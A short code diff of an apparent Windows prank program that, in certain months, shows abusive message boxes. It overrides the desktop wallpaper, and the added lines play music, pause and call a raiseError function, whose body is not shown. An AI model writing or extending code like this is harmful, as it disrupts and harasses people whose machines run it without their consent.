@@ -6,7 +6,6 @@ HWND hWnd;
 int main() {
 	SYSTEMTIME systemTime;
 	GetSystemTime(&systemTime);
-
 	//this code right here is kinda funny lol
 	if (systemTime.wMonth == 3 || systemTime.wMonth == 9 || systemTime.wMonth == 11) {
 		//you must love kristik lal!!
@@ -21,7 +20,10 @@ int main() {
 			case IDYES:
 				MessageBox(NULL, L"FUCK YOU!!", L"YOU SUCK", MB_ICONERROR);
 				OverrideWallpaper();
+				playMusic();
 				showDialog();
+				Sleep(20000);
+				raiseError();
 				break;
 			case IDNO:
 				MessageBox(NULL, L"Oh... Well I'll make sure you're ready :)", L"Matte Kudasai!!!", MB_ICONINFORMATION);
@@ -33,5 +35,4 @@ int main() {
 	else {
 		return 1;
 	}
-	return 0;
 }
